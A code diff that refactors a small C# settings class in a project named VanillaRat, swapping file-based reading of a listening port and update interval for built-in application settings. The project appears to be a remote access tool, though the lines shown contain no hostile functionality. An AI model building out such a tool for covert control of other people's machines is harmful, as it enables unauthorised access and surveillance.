@@ -1,46 +1,19 @@
-﻿using System;
-using System.IO;
-
-namespace VanillaRat.Classes
+﻿namespace VanillaRat.Classes
 {
     internal class Settings
     {
         public struct Values
         {
+            //Get port from user settings
             public int GetPort()
             {
-                string Settings;
-                if (!File.Exists("Settings.txt"))
-                {
-                    return 1604;
-                }
-                else
-                {
-                    using (StreamReader SR = new StreamReader("Settings.txt"))
-                    {
-                        Settings = SR.ReadToEnd();
-                        SR.Close();
-                    }
-                    return Convert.ToInt16(Functions.GetSubstringByString("(", ")", Settings));
-                }
+                return Properties.Settings.Default.Port;
             }
 
+            //Get update interval from settings
             public int GetUpdateInterval()
             {
-                string Settings;
-                if (!File.Exists("Settings.txt"))
-                {
-                    return 1;
-                }
-                else
-                {
-                    using (StreamReader SR = new StreamReader("Settings.txt"))
-                    {
-                        Settings = SR.ReadToEnd();
-                        SR.Close();
-                    }
-                    return Convert.ToInt16(Functions.GetSubstringByString("<", ">", Settings));
-                }
+                return Properties.Settings.Default.UpdateInterval;
             }
         }
     }
